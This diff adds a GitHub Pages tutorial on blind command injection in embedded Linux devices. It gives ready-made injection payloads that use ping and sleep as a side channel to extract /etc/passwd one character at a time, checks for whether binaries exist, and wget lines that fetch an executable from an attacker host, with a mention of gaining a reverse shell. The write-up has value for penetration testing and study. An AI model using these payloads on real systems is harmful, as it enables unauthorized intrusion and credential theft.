@@ -1,0 +1,192 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <title>Cmap by Ceenix</title>
+
+    <link rel="stylesheet" href="stylesheets/styles.css">
+    <link rel="stylesheet" href="stylesheets/pygment_trac.css">
+    <script src="javascripts/scale.fix.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1 class="header">Cmap</h1>
+        <p class="header">Blind Command Injection on Embedded Systems (using grep, sed and others)</p>
+
+        <ul>
+          <li class="download"><a class="buttons" href="https://github.com/Ceenix/cmap/zipball/master">Download ZIP</a></li>
+          <li class="download"><a class="buttons" href="https://github.com/Ceenix/cmap/tarball/master">Download TAR</a></li>
+          <li><a class="buttons github" href="https://github.com/Ceenix/cmap">View On GitHub</a></li>
+        </ul>
+
+        <p class="header">This project is maintained by <a class="header name" href="https://github.com/Ceenix">Ceenix</a></p>
+
+
+      </header>
+      <section>
+        <h1>
+<a id="blind-command-injection-on-embedded-systems-using-test-grep-sed-and-others" class="anchor" href="#blind-command-injection-on-embedded-systems-using-test-grep-sed-and-others" aria-hidden="true"><span class="octicon octicon-link"></span></a>Blind Command Injection on Embedded Systems (using <em>test,</em> <em>grep,</em> <em>sed</em> and <em>others</em>)</h1>
+
+<p>When you find an <strong>offsec 101</strong> style blind-command injection on embedded systems, you may have difficulties because of their restricted environments.</p>
+
+<pre><code>;ping -c1 192.168.1.2;
+</code></pre>
+
+<p>Even though you may able to run some commands like <em>ping</em> or <em>reboot</em>... other commands may not work. Since the output was not showing, you cannot be sure if the commands do not exists or they fail for a reason.</p>
+
+<p>So, in such scenarios I always check for my injection commands as in the example below:</p>
+
+<pre><code># This command will ping you back if `ls` is found in "/bin" directory
+;if test -e "/bin/ls";then ping -c1 192.168.1.2;fi;
+# or better
+;if test -e "/bin/ls";then ping -c1 192.168.1.2;else ping -c2 192.168.1.2;fi;
+</code></pre>
+
+<p>After I see that this approach works, I use more commands to understand my target environment better:</p>
+
+<pre><code># To check if "/tmp" directory exsists?
+;if test -d "/tmp";then ping -c2 192.168.1.2;fi;
+# To check if "/var/passwd" file is exsists and has read permissions?
+;if test -r "/var/passwd";then ping -c2 192.168.1.2;fi;
+;if test -r "/etc/passwd";then ping -c2 192.168.1.2;fi;
+# To check if logger exists? -- which is another tricky command used in BlindCI...
+;if test -e "/usr/bin/logger";then ping -c1 192.168.1.2;fi;
+# To check if wget is exists?
+;if test -e "/bin/wget";then ping -c1 192.168.1.2;fi;
+;if test -e "/sbin/wget";then ping -c1 192.168.1.2;fi;
+;if test -e "/usr/bin/wget";then ping -c1 192.168.1.2;fi;
+;if test -e "/usr/sbin/wget";then ping -c1 192.168.1.2;fi;
+</code></pre>
+
+<h6>
+<a id="note-embedded-systems-may-differ-depending-to-their-build-systemsbuildroot-linuxfromscratch-yocto-andor-they-can-use-slightly-different-versions-of-well-known-commands-thus-you-may-need-to-change-some-parameters-while-using-those-commands-since-we-are-talking-about-blind-command-injection-you-have-to-be-sure-that-your-injection-commandbinary-is-installed-on-your-target-thats-why-it-is-a-good-practice-to-check-your-commands-in-all-possible-bin-directories" class="anchor" href="#note-embedded-systems-may-differ-depending-to-their-build-systemsbuildroot-linuxfromscratch-yocto-andor-they-can-use-slightly-different-versions-of-well-known-commands-thus-you-may-need-to-change-some-parameters-while-using-those-commands-since-we-are-talking-about-blind-command-injection-you-have-to-be-sure-that-your-injection-commandbinary-is-installed-on-your-target-thats-why-it-is-a-good-practice-to-check-your-commands-in-all-possible-bin-directories" aria-hidden="true"><span class="octicon octicon-link"></span></a>
+<strong><em>Note:</em></strong> Embedded systems may differ depending to their build systems(Buildroot, LinuxFromScratch, Yocto...) and/or they can use slightly different versions of well-known commands. Thus, you may need to change some parameters while using those commands. Since we are talking about BLIND COMMAND INJECTION you have to be sure that your injection command/binary is installed on your target. That's why it is a good practice to check your commands in all possible "bin" directories.</h6>
+
+<p>For example; three commands below does the exact samething, however if you try your injection(s) based on just one <em>version</em> you can <em>"assume"</em> that <strong>wget</strong> does not exsists on your target system.</p>
+
+<pre><code># Different wget versions are widely using on Embedded Systems...
+wget -g -r exe -l exe 192.168.1.2
+wget http://192.168.1.2/exe
+wget 192.168.1.2/exe
+</code></pre>
+
+<p>Lately; this approach gave me the idea of using Linux commands to read sensitive information (for example <em>root password</em>) from the system. Exactly like well-known "Blind SQL Injection" attacks.</p>
+
+<p>In time-based Blind SQL Injection HTTP responses returns with a delay if the "query" is true. </p>
+
+<pre><code># http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
+IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1)) 
+</code></pre>
+
+<p>So, this exact logic could be simulated with Linux commands.</p>
+
+<p>In <em>nix, we have very powerful commands like *</em>grep** and <strong>sed</strong>. And they do perfect job in file manipulation, searching strings, filtering results  and so on.... This means that we can <strong><em>reveal</em></strong> some critical information by crafting  simple <strong>shell</strong> commands.</p>
+
+<h4>
+<a id="lets-try" class="anchor" href="#lets-try" aria-hidden="true"><span class="octicon octicon-link"></span></a>Let's try!</h4>
+
+<pre><code>$ if test `sed -n '/^root/{s/^\(.\{1\}\).*/\1/g;p}' /etc/passwd`;then echo 1;else echo 2;fi
+1
+</code></pre>
+
+<p>This command prints <strong>1</strong> because <em>"/etc/passwd"</em> contains a line which starts(^) with <strong>root</strong>. 
+Actually, real approach should be something like:</p>
+
+<pre><code>$ if test `sed -n '/^r/{s/^\(.\{1\}\).*/\1/g;p}' /etc/passwd`;then echo 1;else echo 2;fi
+1
+$ if test `sed -n '/^ro/{s/^\(.\{1\}\).*/\1/g;p}' /etc/passwd`;then echo 1;else echo 2;fi
+1
+$ if test `sed -n '/^roo/{s/^\(.\{1\}\).*/\1/g;p}' /etc/passwd`;then echo 1;else echo 2;fi
+1
+$ if test `sed -n '/^root/{s/^\(.\{1\}\).*/\1/g;p}' /etc/passwd`;then echo 1;else echo 2;fi
+1
+...
+</code></pre>
+
+<p>As you can imagine, we can <strong>reveal</strong> the whole content of the target file just by replacing the following character.
+With this technique you can look at the beginning of the line, at the end of the line or a specific line or maybe for a pattern... </p>
+
+<p>Once you got the idea, you can play with the command, change it as you like and  you can use <strong>grep</strong>(or any other command) instead of sed.</p>
+
+<p>It is also very easy to automate this operation. Instead of echoing the result you can use <strong>sleep</strong> command to reveal next character and just like in time-based blind-sql injection, <strong>response time</strong> can be used as decision indicator.</p>
+
+<h4>
+<a id="tips-and-tricks" class="anchor" href="#tips-and-tricks" aria-hidden="true"><span class="octicon octicon-link"></span></a>Tips and Tricks</h4>
+
+<p>Off course this approach may not be useful in some cases:</p>
+
+<ul>
+<li> You may not need it. Most of the time <strong>wget</strong> works great and you can have your reverse shell.</li>
+<li>Character limitation problems, sometimes you cannot enter more than 40(or whatever) characters. In this case you may try to change your injection command or you can try to use another <em>blind command injection</em> technique (for ex. redirecting syslog output and using <strong>logger</strong> command).</li>
+<li>Character filters; Ampersand(&amp;), pipe(|), sharp(#), grave accent(`), apostrophe(')... might be filtered and this approach cannot work at all or can work for some commands only.</li>
+<li>test, sed, grep and variants may not be available.</li>
+</ul>
+
+<p>Since this approach relies on regular expressions, while crafting your commands you have to remember that wildcard characters can give you false results. So, it is important to use it properly:</p>
+
+<pre><code># All these commands will ping back
+# dot(.) will match with a single character
+# asterisk(*) will match any number of characters
+;if test `sed -n '/^root/{s/^\(.\{1\}\).*/\1/g;p}' /var/passwd`;then ping -c 1 192.168.1.2;fi;
+;if test `sed -n '/^roo./{s/^\(.\{1\}\).*/\1/g;p}' /var/passwd`;then ping -c 1 192.168.1.2;fi;
+;if test `sed -n '/^roo*/{s/^\(.\{1\}\).*/\1/g;p}' /var/passwd`;then ping -c 1 192.168.1.2;fi;
+</code></pre>
+
+<p>So, if you are going to automatize this attack, you should put the period(.)  as your last input.</p>
+
+<h4>
+<a id="in-conclusion" class="anchor" href="#in-conclusion" aria-hidden="true"><span class="octicon octicon-link"></span></a>In Conclusion:</h4>
+
+<p>This is not a new technique but it's an adaptation of existing technique in a different environment. And it's not specifically designed for embedded devices. It will work with any *nix platform. However; since the other platforms will probably have more commands, this approach won't be needed. </p>
+
+<p>I'm sure that better and shorter commands can be written, so feel free to inform me. </p>
+
+<h4>
+<a id="here-are-some-examples" class="anchor" href="#here-are-some-examples" aria-hidden="true"><span class="octicon octicon-link"></span></a>Here are some examples:</h4>
+
+<pre><code># This command will look for any line starts with root user...
+if test `sed -n '/^roo:/{s/^\(.\{1\}\).*/\1/g;p}' /var/passwd`;then sleep 15;fi
+
+# This command will look for any line starts with ftp user...
+if test `sed -n '/^ftp:/{s/^\(.\{1\}\).*/\1/g;p}' /var/passwd`;then sleep 15;fi
+
+# This command will look at the 2nd line and will sleep if the line starts with 0...
+if test `sed -n 2p /etc/passwd|sed -n '/^0/{s/^\(.\{1\}\).*/\1/g;p}'`;then sleep 15;fi
+
+# This command will ping you back if "root" was found (anywhere) in the 1st line
+if test `sed -n 1p /etc/passwd|sed -n '/root/{s/^\(.\{1\}\).*/\1/g;p}'`;then ping -c1 192.168.1.2;fi
+
+# This command will ping if the line's length which contains "root" 
+# in "/etc/password" is equal to 10
+s=`cat /etc/passwd|grep root`;if test ${#s} -eq 10;then ping -c1 192.168.1.2;fi
+
+# ping back if `pwd` is "/tmp"
+if test `pwd` == "/tmp";then ping -c1 192.168.1.2;fi
+
+# you can "reveal" exact Linux version, useful while for compiling your shell code
+if test `sed -n '/^Linux version 2.6.30/{s/^\(.\{1\}\).*/\1/g;p}' /proc/version`;then echo 1;fi
+
+# grep example -- self explanatory, echo 1 if first character is "r"...
+if test `grep root /etc/passwd|grep -o .|sed -n 1p` = "r";then echo 1; else echo 2;fi
+if test `grep root /etc/passwd|grep -o ..|sed -n 1p` = "ro";then echo 1; else echo 2;fi
+if test `grep root /etc/passwd|grep -o ...|sed -n 1p` = "roo";then echo 1; else echo 2;fi
+...
+</code></pre>
+
+<h5>
+<a id="cenk-kalpakoğlu" class="anchor" href="#cenk-kalpako%C4%9Flu" aria-hidden="true"><span class="octicon octicon-link"></span></a>Cenk Kalpakoğlu</h5>
+      </section>
+      <footer>
+        <p><small>Hosted on <a href="http://pages.github.com">GitHub Pages</a> using the Dinky theme</small></p>
+      </footer>
+    </div>
+    <!--[if !IE]><script>fixScale(document);</script><![endif]-->
+		
+  </body>
+</html>
